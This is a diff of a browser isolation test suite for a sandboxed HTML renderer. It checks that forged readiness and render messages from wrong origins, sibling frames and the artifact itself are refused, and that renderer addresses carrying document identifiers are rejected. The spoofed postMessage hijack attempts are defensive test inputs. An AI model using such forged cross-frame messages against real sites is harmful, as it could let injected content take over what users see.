+      "?artifact=interactive&mode=manual",
+    );
+    await waitFor(
+      async () => (await rendererState(renderer)).state === "waiting",
+      named("the renderer never reached its waiting state"),
+    );
+    const sentAfterRealReady = await page.evaluate(() => window.__app.sent);
+    assert.equal(sentAfterRealReady, 0, named("manual mode sent nothing on the real readiness"));
+
+    /* Right origin, wrong window: a second renderer frame on the same origin. */
+    await page.evaluate(() => window.__addSecondRenderer());
+    await waitFor(
+      () => page.evaluate(() => window.__app.refused.includes("window")),
+      named("a readiness message from a second renderer frame was not refused"),
+    );
+
+    /* Wrong origin, from a frame that speaks the protocol perfectly. */
+    await page.evaluate((origin) => window.__addForeignFrame(origin), evilOrigin);
+    await waitFor(
+      () => page.evaluate(() => window.__app.refused.includes("origin")),
+      named("a readiness message from the wrong origin was not refused"),
+    );
+
+    assert.equal(
+      await page.evaluate(() => window.__app.sent),
+      0,
+      named("no forged readiness caused the document to be sent"),
+    );
+    assert.equal(
+      (await rendererState(renderer)).frames,
+      0,
+      named("no forged readiness caused anything to render"),
+    );
+  });
+
   /* ---- forged messages ---- */
 
-  await withContext(async (context) => {
+  await withContext("forged-render", async (context) => {
     const { page, renderer } = await openViewer(
       context,
       appOrigin,
@@ -1257,9 +1735,9 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
         appOrigin: evil,
         container,
       });
-      return true;
+      return window.__probe.state();
     }, evilOrigin);
-    assert.ok(forged, named("the probe instance mounted"));
+    assert.equal(forged, "waiting", named("the probe instance mounted and is listening"));
     await page.evaluate(() => window.__send());
     await waitFor(
       () => renderer.evaluate(() => window.__probe.rejections().includes("wrong-origin")),
@@ -1298,28 +1776,54 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     );
 
     /* A message from the artifact itself -- a child window -- is refused for the
-       same reason a sibling's is. */
+       same reason a sibling's is, and no message it can invent is a protocol.
+       The refusal log is a set of distinct reasons, so the evidence here is the
+       outcome rather than a count: a rendered artifact that stays the rendered
+       artifact, with `wrong-window` recorded and nothing new alongside it. */
     const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame to speak from"));
-    const rejectionsBefore = (await rendererState(renderer)).rejections.length;
+    const beforeArtifact = await rendererState(renderer);
+    const originalHtml = await artifact.evaluate(() => document.body.innerHTML);
     await artifact.evaluate(() => {
-      parent.postMessage({ type: "archon:render", v: 1, html: "<p>from the artifact</p>" }, "*");
-      parent.postMessage({ type: "archon:resize", v: 1, height: 9000 }, "*");
+      for (let attempt = 0; attempt < 50; attempt += 1) {
+        parent.postMessage({ type: "archon:render", v: 1, html: "<p id=hijacked>from the artifact</p>" }, "*");
+        parent.postMessage({ type: "archon:resize", v: 1, height: 9000 }, "*");
+        parent.postMessage("archon:ready", "*");
+      }
     });
-    await waitFor(
-      async () => (await rendererState(renderer)).rejections.length > rejectionsBefore,
-      named("a message from the artifact was not refused"),
-    );
+    await new Promise((r) => setTimeout(r, 500));
     const afterArtifact = await rendererState(renderer);
+    assert.deepEqual(
+      afterArtifact.rejections,
+      beforeArtifact.rejections,
+      named("the artifact's messages added no new refusal reason"),
+    );
     assert.ok(
-      afterArtifact.rejections.slice(rejectionsBefore).every((reason) => reason === "wrong-window"),
+      afterArtifact.rejections.includes("wrong-window"),
       named("a message from the artifact is refused as the wrong window"),
     );
     assert.equal(afterArtifact.frames, 1, named("the artifact could not cause a second render"));
+    assert.equal(
+      await artifactFrameOf(page).evaluate(() => document.body.innerHTML),
+      originalHtml,
+      named("the artifact could not replace what the reader is looking at"),
+    );
+    /* A hundred and fifty messages counted, and the reason log is still four
+       entries at most: the set is what stops an artifact from growing an
+       unbounded array and rejoining it on every message, in the same tab as the
+       account page, while the counter keeps the refusals countable. */
+    assert.ok(
+      afterArtifact.refusals > beforeArtifact.refusals + 100,
+      named(`every artifact message was counted (saw ${afterArtifact.refusals})`),
+    );
+    assert.ok(
+      afterArtifact.rejections.length <= 4,
+      named(`the reason log stays bounded (saw ${afterArtifact.rejections.length})`),
+    );
   });
 
   /* ---- malformed and oversized messages ---- */
 
-  await withContext(async (context) => {
+  await withContext("malformed-messages", async (context) => {
     const { page, renderer } = await openViewer(
       context,
       appOrigin,
@@ -1353,7 +1857,7 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     });
 
     await waitFor(
-      async () => (await rendererState(renderer)).rejections.length >= malformed,
+      async () => (await rendererState(renderer)).refusals >= malformed,
       named("not every malformed message was refused"),
     );
     const refused = await rendererState(renderer);
@@ -1379,7 +1883,7 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
 
   /* ---- the renderer never arriving is a recoverable state on the account origin ---- */
 
-  await withContext(async (context) => {
+  await withContext("renderer-unavailable", async (context) => {
     const { page } = await openViewer(
       context,
       appOrigin,
@@ -1401,6 +1905,41 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     );
     assert.equal(artifactFrameOf(page), undefined, named("no artifact frame exists after a failed renderer"));
   });
+
+  /* ---- the renderer address carries nothing ---- */
+
+  await withContext("renderer-url-parameters", async (context) => {
+    /* An `about:srcdoc` document inherits its parent's base URL, so anything in
+       the renderer's own query or fragment is readable by the artifact as
+       `document.baseURI` -- and the artifact's `base-uri 'none'` means it cannot
+       be neutralised afterwards. The renderer therefore refuses to mount at all
+       when its address carries either, which is what stops a future viewer edit
+       like `?doc=<id>` from handing a document identifier to the author of
+       arbitrary uploaded HTML. */
+    for (const suffix of ["?doc=d1", "#share-token"]) {
+      const page = await context.newPage();
+      await page.goto(`${renderOrigin}/${suffix}`);
+      const observed = await rendererState(page.mainFrame());
+      assert.equal(observed.state, "unconfigured", named(`the renderer refuses ${suffix}`));
+      assert.equal(observed.frames, 0, named(`the renderer renders nothing for ${suffix}`));
+      await page.close();
+    }
+
+    /* And the same page with a bare address still mounts, so the case above is
+       about the parameter rather than about a renderer that never works. */
+    const clean = await context.newPage();
+    await clean.goto(`${renderOrigin}/`);
+    assert.equal(
+      (await rendererState(clean.mainFrame())).state,
+      "standalone",
+      named("a bare renderer address still mounts"),
+    );
+  });
+
+  /* Proof of work. A matrix that returned early, threw into a swallowing catch
+     or skipped an engine would reach this line with a short list. */
+  assert.deepEqual(completed, [...MATRIX_CASES], named("every matrix case ran, in order"));
+  return { completed, policies };
 }
 
 /* ------------------------------------------------------------------ *
@@ -1430,14 +1969,15 @@ async function worker() {
   await assertBuildRefusesInjection();
 
   const state = {
-    app: { requests: [], contentReads: [], mutations: [] },
+    app: { requests: [], contentRequests: [], contentReads: [], mutations: [] },
+    renderer: { requests: [] },
     evil: { requests: [] },
   };
   const config = { renderOrigin: "", artifacts: {} };
   const bundle = { headers: [], files: new Map() };
 
   const app = await startApp(state.app, config);
-  const renderer = await startRenderer(bundle);
+  const renderer = await startRenderer(bundle, state.renderer);
   const evil = await startEvil(state.evil, config);
   config.renderOrigin = renderer.origin;
 
@@ -1459,13 +1999,16 @@ async function worker() {
     config.artifacts.interactive = INTERACTIVE_ARTIFACT;
     config.artifacts.hostile = hostileArtifact({ appOrigin: app.origin, evilOrigin: evil.origin });
     config.artifacts.fragments = FRAGMENT_ARTIFACT;
+    config.artifacts["self-navigation"] = selfNavigatingArtifact({ evilOrigin: evil.origin });
 
     const versions = [];
+    let cases = null;
+    let policies = new Map();
     for (const engine of ENGINES) {
       const browser = await playwright[engine].launch();
       opened.push(browser);
       versions.push(`${engine} ${browser.version()}`);
-      await runMatrix({
+      const result = await runMatrix({
         engine,
         browser,
         appOrigin: app.origin,
@@ -1474,9 +2017,21 @@ async function worker() {
         state,
         headers: bundle.headers,
       });
+      /* Both engines run the same list, so a per-engine skip is a mismatch here
+         as well as a short list inside the matrix. */
+      if (cases === null) cases = result.completed;
+      else assert.deepEqual(result.completed, cases, `${engine} ran a different set of cases`);
+      policies = result.policies;
     }
 
-    process.stdout.write(`PASS  hosted renderer isolation matrix (${versions.join(", ")})\n`);
+    /* The policies this run actually validated, recorded where a reviewer of a
+       CI log can read them without rerunning anything. */
+    for (const [name, value] of policies) {
+      process.stdout.write(`INFO  ${name} policy: ${value}\n`);
+    }
+    process.stdout.write(
+      `PASS  hosted renderer isolation matrix (${versions.join(", ")}; ${cases.length} cases per engine)\n`,
+    );
   } finally {
     for (const browser of opened) await browser.close();
     await app.close();
